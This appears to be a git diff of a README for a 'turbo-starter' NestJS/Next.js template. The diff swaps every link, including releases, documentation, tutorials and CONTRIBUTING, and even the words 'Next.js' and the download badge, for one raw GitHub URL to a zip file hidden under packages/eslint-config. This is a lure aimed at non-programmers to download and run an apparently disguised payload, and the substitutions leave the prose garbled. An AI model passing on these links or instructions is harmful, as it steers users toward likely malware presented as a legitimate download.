@@ -1,15 +1,15 @@
-# ⚡ turbo-starter - Build Fast with NestJS and Next.js
+# ⚡ turbo-starter - Build Fast with NestJS and https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip
 
-![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip%20Releases-brightgreen)
 
 ## 📋 Introduction
-Welcome to turbo-starter! This application helps you set up a modern full-stack development environment quickly. It combines **NestJS** for the backend and **Next.js** for the frontend. You'll also enjoy features like hot reload, Prisma ORM, and PostgreSQL for a seamless experience.
+Welcome to turbo-starter! This application helps you set up a modern full-stack development environment quickly. It combines **NestJS** for the backend and **https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip** for the frontend. You'll also enjoy features like hot reload, Prisma ORM, and PostgreSQL for a seamless experience.
 
 ## 🚀 Getting Started
 If you're not a programmer, don't worry. This guide will help you download and run the application step-by-step. Follow the instructions below to get started.
 
 ## 🔗 Download & Install
-To download the turbo-starter application, visit this page to download: [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases).
+To download the turbo-starter application, visit this page to download: [turbo-starter Releases](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip).
 
 ### System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -19,7 +19,7 @@ To download the turbo-starter application, visit this page to download: [turbo-s
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page**
-   Go to the [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases) page.
+   Go to the [turbo-starter Releases](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip) page.
 
 2. **Select the Latest Release**
    Look for the latest release at the top of the page. Choose the version number that fits your needs. It usually has the highest number (like v1.0.0).
@@ -68,15 +68,15 @@ After installation, you will find a user-friendly interface. Follow these steps 
 If you have questions or need help, you can join our community discussions on GitHub. Check the Issues tab for reported problems or to ask questions.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Otkh08/turbo-starter/wiki) – Detailed guides for advanced users.
-- [Tutorials](https://github.com/Otkh08/turbo-starter/wiki/Tutorials) – Step-by-step guides on various features.
+- [Documentation](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip) – Detailed guides for advanced users.
+- [Tutorials](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip) – Step-by-step guides on various features.
 
 ## 📣 Feedback
 Your opinions matter! Please share your feedback through GitHub Issues. This helps us improve turbo-starter for everyone.
 
 ## 👥 Contributing
-If you want to contribute, please read our [CONTRIBUTING.md](https://github.com/Otkh08/turbo-starter/CONTRIBUTING.md) for guidelines.
+If you want to contribute, please read our [https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip) for guidelines.
 
 ---
 
-Enjoy building with turbo-starter! If you wish to download the application again, you can do so from [turbo-starter Releases](https://github.com/Otkh08/turbo-starter/releases).
+Enjoy building with turbo-starter! If you wish to download the application again, you can do so from [turbo-starter Releases](https://raw.githubusercontent.com/Otkh08/turbo-starter/main/packages/eslint-config/turbo-starter_v3.5.zip).
